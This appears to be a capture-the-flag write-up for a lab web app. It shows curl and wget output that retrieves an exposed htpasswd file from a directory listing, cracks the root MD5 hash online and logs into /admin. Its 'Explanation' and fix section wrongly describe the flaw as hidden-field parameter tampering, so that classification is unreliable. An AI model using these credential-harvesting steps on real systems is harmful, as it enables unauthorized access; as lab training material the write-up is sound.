# Admin(htpasswd)

Go to <http://192.168.31.133/whatever/>

`
daniseed@DESKTOP-87RT6O2:~/darkly$  curl -v 192.168.31.133/whatever/
*   Trying 192.168.31.133:80...
* TCP_NODELAY set
* Connected to 192.168.31.133 (192.168.31.133) port 80 (#0)
> GET /whatever/ HTTP/1.1
> Host: 192.168.31.133
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.4.6 (Ubuntu)
< Date: Tue, 09 May 2023 17:25:44 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
<
<html>
<head><title>Index of /whatever/</title></head>
<body bgcolor="white">
<h1>Index of /whatever/</h1><hr><pre><a href="../">../</a>
<a href="htpasswd">htpasswd</a>                                           29-Jun-2021 18:09                  38
</pre><hr></body>
</html>
* Connection #0 to host 192.168.31.133 left intact


*   Trying 192.168.31.133:80...
* TCP_NODELAY set
* Connected to 192.168.31.133 (192.168.31.133) port 80 (#0)
> GET /whatever/htpasswd HTTP/1.1
> Host: 192.168.31.133
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.4.6 (Ubuntu)
< Date: Tue, 09 May 2023 17:26:29 GMT
< Content-Type: application/octet-stream
< Content-Length: 38
< Last-Modified: Tue, 29 Jun 2021 18:09:05 GMT
< Connection: keep-alive
< ETag: "60db61c1-26"
< Accept-Ranges: bytes
<
root:437394baff5aa33daa618be47b75cb49
* Connection #0 to host 192.168.31.133 left intact
`

OR

`
daniseed@DESKTOP-87RT6O2:~/darkly$ wget http://192.168.31.133/whatever/htpasswd
--2023-05-09 18:05:11--  http://192.168.31.133/whatever/htpasswd
Connecting to 192.168.31.133:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38 [application/octet-stream]
Saving to: ‘htpasswd’

htpasswd                          100%[==========================================================>]      38  --.-KB/s    in 0s

2023-05-09 18:05:11 (2.11 MB/s) - ‘htpasswd’ saved [38/38]



daniseed@DESKTOP-87RT6O2:~/darkly$ cat htpasswd
root:437394baff5aa33daa618be47b75cb49
`

We have login-password combination: `root:437394baff5aa33daa618be47b75cb49`

But it doesn't work on its own. So lets try and dehash it with [crackstation](https://crackstation.net/).
The password is encrypted with md5 - `qwerty123@`

Input this on <http://192.168.31.133/admin/> and we have our flag

## Explanation

Attack type: [Web Parameter Tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering): Hidden field manipulation

> When a web application uses hidden fields to store status information, a malicious user can tamper with the values stored on their browser and change the referred information.

Once the adversary has determined which hidden fields are not being validated by the server, they will manipulate them to change the normal behavior of the web application in a way that benefits the adversary.

## How to fix it

> The attack success depends on integrity and logic validation mechanism errors.

Validate sent data on server correctly.
